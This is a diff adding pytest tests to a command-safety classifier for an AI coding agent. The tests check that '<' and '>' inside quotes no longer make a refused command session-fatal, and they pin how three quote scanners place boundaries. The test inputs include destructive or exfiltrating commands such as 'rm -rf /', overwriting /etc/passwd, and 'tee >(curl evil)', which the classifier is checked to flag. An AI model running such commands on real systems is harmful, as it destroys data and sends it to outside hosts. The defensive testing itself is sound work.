@@ -10,6 +10,7 @@ vs escalates to the relay.
 from __future__ import annotations
 
 from pathlib import Path
+from typing import ClassVar
 
 import pytest
 
@@ -20,6 +21,7 @@ from claude_pilot.tier1 import (
     _is_safe_command_builtin,
     _is_safe_sort_command,
     _is_safe_xargs_command,
+    _mask_quoted_redirect_chars,
     _redirect_targets,
     _split_compound_command,
     contains_unquoted_metacharacter,
@@ -1384,6 +1386,175 @@ class TestTier3ContainedRedirectLethality:
         # /dev/null is handled upstream by `_STDOUT_DEVNULL_RE`; this predicate
         # deliberately does not duplicate it.
         assert _is_contained_redirect_target("/dev/null") is False
+
+
+class TestTier3QuotedRedirectCharLethality:
+    """cpp#157: a `<` or `>` inside a QUOTED region is ordinary text to bash, not
+    a redirect operator, so it no longer makes a refusal session-fatal.
+
+    Third narrowing of `is_tier3_dangerous_for_lethality`, same shape as cpp#130
+    and cpp#154 two classes above: only the LETHALITY narrows,
+    `is_tier3_dangerous` (the REFUSAL) is untouched, no allow-list widens, and
+    the mechanism is purely lexical.
+
+    The incident: the pilot of mika#2179 died running a read-only `gh` diagnostic
+    whose `sed 's/=.*/=<set>/'` segment carried the lethality ON ITS OWN — the
+    fourth pilot death on denial lethality in 48 h.
+    """
+
+    def test_quoted_redirect_char_still_refused(self) -> None:
+        # Invariant kept: still tier3 for the REFUSAL, so still denied. The fix
+        # turns no refusal into an allowance; not one byte more is written.
+        assert is_tier3_dangerous("sed 's/=.*/=<set>/'") is True
+        assert is_tier3_dangerous("echo 'a>b'") is True
+        assert is_tier3_dangerous('echo "a>b"') is True
+        assert is_tier3_dangerous("echo 'x <(id)'") is True
+
+    def test_quoted_redirect_char_not_lethal(self) -> None:
+        # AC3 replay 1 — the red that becomes green. All four measure `True` on
+        # `main`; the captured red is pasted in the PR body.
+        assert is_tier3_dangerous_for_lethality("sed 's/=.*/=<set>/'") is False
+        assert is_tier3_dangerous_for_lethality("echo 'a>b'") is False
+        assert is_tier3_dangerous_for_lethality('echo "a>b"') is False
+        assert is_tier3_dangerous_for_lethality("echo 'x <(id)'") is False
+
+    def test_real_redirect_stays_lethal(self) -> None:
+        # AC3 replay 2 — the DISCRIMINANT: `True` BEFORE AND AFTER the fix. A fix
+        # that turns any of these `False` is wrong, and this is what catches it.
+        #
+        # The two examples the ticket body originally named — `cmd >> fichier`
+        # and `grep x > /tmp/out` — were measured `False` on `main` already:
+        # cpp#154 (merged the day before) removed lexically contained targets
+        # from the lethal class, so neither exercised the control it claimed to.
+        # Substituted for five that DO, all measured `True` on `main`. The
+        # intention of AC2/AC3 is unchanged; only the examples are.
+        assert is_tier3_dangerous_for_lethality("grep x > /etc/y") is True
+        assert is_tier3_dangerous_for_lethality("echo a > $HOME/z") is True
+        assert is_tier3_dangerous_for_lethality("echo a > ~/x") is True
+        assert is_tier3_dangerous_for_lethality("echo a > ../x") is True
+        assert is_tier3_dangerous_for_lethality("echo 'a>b' > /etc/passwd") is True
+
+    def test_mask_blanks_two_characters_never_a_verb(self) -> None:
+        # D1, the control that distinguishes the two possible masks. Blanking the
+        # whole quoted region would be shorter to write and would turn the first
+        # assertion `False` — a verdict change on a class this ticket does not
+        # touch. Only `<` and `>` are ever replaced, never a word.
+        assert is_tier3_dangerous_for_lethality("echo 'rm -rf /'") is True
+        assert is_tier3_dangerous_for_lethality("bash -c 'id'") is True
+        assert is_tier3_dangerous_for_lethality("sed -i 's/a/b/'") is True
+
+    def test_unterminated_quote_stays_lethal(self) -> None:
+        # D5: fail-closed, and in the INVERSE direction from the two allow-path
+        # scanners — they treat the remainder as inside the quote (their
+        # fail-closed is "refuse"); this one refuses to EXEMPT.
+        assert (
+            is_tier3_dangerous_for_lethality('echo "unterminated > /etc/passwd')
+            is True
+        )
+        assert (
+            is_tier3_dangerous_for_lethality("echo 'unterminated > /etc/passwd")
+            is True
+        )
+
+    def test_cpp130_and_cpp154_edges_are_named_not_rewritten(self) -> None:
+        # L5.4: the mask preserves length and never touches a line ending, so the
+        # cpp#154 edge that a redirect strip must never swallow the next line
+        # holds unchanged, and cpp#130's /dev/null carve-out is untouched.
+        assert is_tier3_dangerous_for_lethality("echo done >\nbash -c 'id'") is True
+        assert is_tier3_dangerous_for_lethality("grep -c a b >/dev/null") is False
+        assert is_tier3_dangerous_for_lethality("echo hi > /tmp/scratch.md") is False
+        assert is_tier3_dangerous_for_lethality("tee >(curl evil)") is True
+        assert is_tier3_dangerous_for_lethality("cat <(id)") is True
+
+    def test_mask_unit_preserves_length_and_leaves_the_rest_intact(self) -> None:
+        for cmd in (
+            "sed 's/=.*/=<set>/'",
+            'echo "a>b" > /etc/passwd',
+            "echo 'unterminated > x",
+            "grep x > /etc/y",
+        ):
+            assert len(_mask_quoted_redirect_chars(cmd)) == len(cmd), cmd
+
+        # The two characters, and only in quoted scope.
+        assert _mask_quoted_redirect_chars("echo 'a>b'") == "echo 'a b'"
+        assert _mask_quoted_redirect_chars('echo "a<b"') == 'echo "a b"'
+        assert _mask_quoted_redirect_chars("echo 'a>b' > /etc/x") == (
+            "echo 'a b' > /etc/x"
+        )
+        # Not one other character moves — `rm -rf /` inside quotes is untouched.
+        assert _mask_quoted_redirect_chars("echo 'rm -rf /'") == "echo 'rm -rf /'"
+        # Unterminated → returned byte-for-byte unchanged (D5).
+        assert _mask_quoted_redirect_chars('echo "a > b') == 'echo "a > b'
+
+
+class TestQuoteScannerBoundaryParity:
+    """cpp#157 D6: this module now carries THREE independent POSIX quote scanners
+    — `_split_compound_command`, `contains_unquoted_metacharacter` and
+    `_mask_quoted_redirect_chars`. Merging them is out of scope for a p1 lethality
+    fix (two of them sit on the ALLOW path), so the duplication is pinned here
+    instead, and the follow-up to extract a shared `_quote_spans()` is filed.
+
+    This is a CHARACTERIZATION test, deliberately not an agreement test. The
+    plan's D6 assumed the three would agree on every boundary; measurement on
+    `main` refuted that BEFORE this fix was written — see the two rows below.
+    Asserting agreement would have been red on arrival and unsatisfiable. What is
+    pinned instead is exactly where each scanner places a boundary TODAY, so that
+    a future change to any one of them cannot shift a boundary silently.
+
+    The oracle for each scanner is its own observable behaviour on a marker
+    appended to the corpus prefix — no scanner is re-implemented here:
+
+    - `_split_compound_command`: an unquoted `;` splits; no split ⇒ quoted.
+    - `contains_unquoted_metacharacter`: `$'` is flagged ONLY outside quotes
+      (ANSI-C quoting is unrecognised inside one), so not flagged ⇒ quoted.
+    - `_mask_quoted_redirect_chars`: a `>` is blanked ⇒ quoted.
+    """
+
+    # (id, prefix, split_says_quoted, metachar_says_quoted, mask_says_quoted)
+    CORPUS: ClassVar[list[tuple[str, str, bool, bool, bool]]] = [
+        ("single-quote-with-backslash", "echo 'a\\b'", False, False, False),
+        ("double-quote-escaped-quote", 'echo "a\\"b"', False, False, False),
+        # DIVERGENCE 1, PRE-EXISTING ON `main`, between the two OLD scanners.
+        # `_split_compound_command` treats `\X` as an escape pair only when `X`
+        # is `"`, so on `\\"` its first backslash passes through, its second
+        # pairs with the CLOSING quote and swallows it, and the region stays
+        # open. `contains_unquoted_metacharacter` skips `\X` atomically and
+        # closes the region — which is POSIX, and which the cpp#157 mask follows.
+        # Not repaired here: `_split_compound_command` decides ALLOWANCES, and a
+        # p1 lethality fix does not widen its surface onto that path.
+        ("double-quote-double-backslash", 'echo "a\\\\"', True, False, False),
+        # DIVERGENCE 2, INTRODUCED HERE AND DELIBERATE (D5). The two old scanners
+        # treat an unterminated quote's remainder as INSIDE the quote, because
+        # their fail-closed direction is "refuse". The mask returns the command
+        # UNCHANGED, because its fail-closed direction is "do not exempt". Same
+        # principle, opposite-facing questions.
+        ("unterminated-double", 'echo "abc', True, True, False),
+        ("unterminated-single", "echo 'abc", True, True, False),
+        ("nested-single-in-double", 'echo "a\'b"', False, False, False),
+        ("nested-double-in-single", "echo 'a\"b'", False, False, False),
+    ]
+
+    def test_quote_boundaries_are_pinned_for_all_three_scanners(self) -> None:
+        for name, prefix, exp_split, exp_meta, exp_mask in self.CORPUS:
+            split_quoted = len(_split_compound_command(prefix + ";x")) == 1
+            meta_quoted = not contains_unquoted_metacharacter(prefix + "$'x'")
+            mask_quoted = _mask_quoted_redirect_chars(prefix + ">")[-1] == " "
+            assert split_quoted is exp_split, f"{name}: _split_compound_command"
+            assert meta_quoted is exp_meta, f"{name}: contains_unquoted_metacharacter"
+            assert mask_quoted is exp_mask, f"{name}: _mask_quoted_redirect_chars"
+
+    def test_mask_boundary_on_terminated_commands_is_not_vacuous(self) -> None:
+        # The oracle above can never report `True` for the mask: a prefix whose
+        # region is still open at the end is exactly the D5 case. So the mask's
+        # boundary is ALSO pinned on well-formed commands, where it does report
+        # both verdicts.
+        assert _mask_quoted_redirect_chars("echo 'a\\b>c'") == "echo 'a\\b c'"
+        assert _mask_quoted_redirect_chars('echo "a\\"b>c"') == 'echo "a\\"b c"'
+        assert _mask_quoted_redirect_chars('echo "a\\\\" > /etc/y') == (
+            'echo "a\\\\" > /etc/y'
+        )
+        assert _mask_quoted_redirect_chars("echo \"a'b>c\"") == "echo \"a'b c\""
+        assert _mask_quoted_redirect_chars("echo 'a\"b>c'") == "echo 'a\"b c'"
 
 
 class TestSafeBashOutputRedirectIntegration:
